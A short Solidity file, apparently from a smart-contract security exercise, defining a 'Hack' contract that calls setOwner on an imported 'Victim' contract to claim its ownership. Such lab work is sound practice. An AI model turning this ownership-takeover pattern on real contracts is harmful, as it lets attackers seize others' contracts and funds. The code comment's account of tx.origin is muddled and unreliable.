// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;
import "./Victim.sol";

contract Hack {
    Victim victim;

    constructor(address _victimContractAddress) {
        victim = Victim(_victimContractAddress);
    }

    function attackThisWeakAssContract() public {
        // address(this) will set the originator to be this contract which is tx.origin
        // and we will claim ownership of the victim contract
        victim.setOwner(address(this));
    }
}
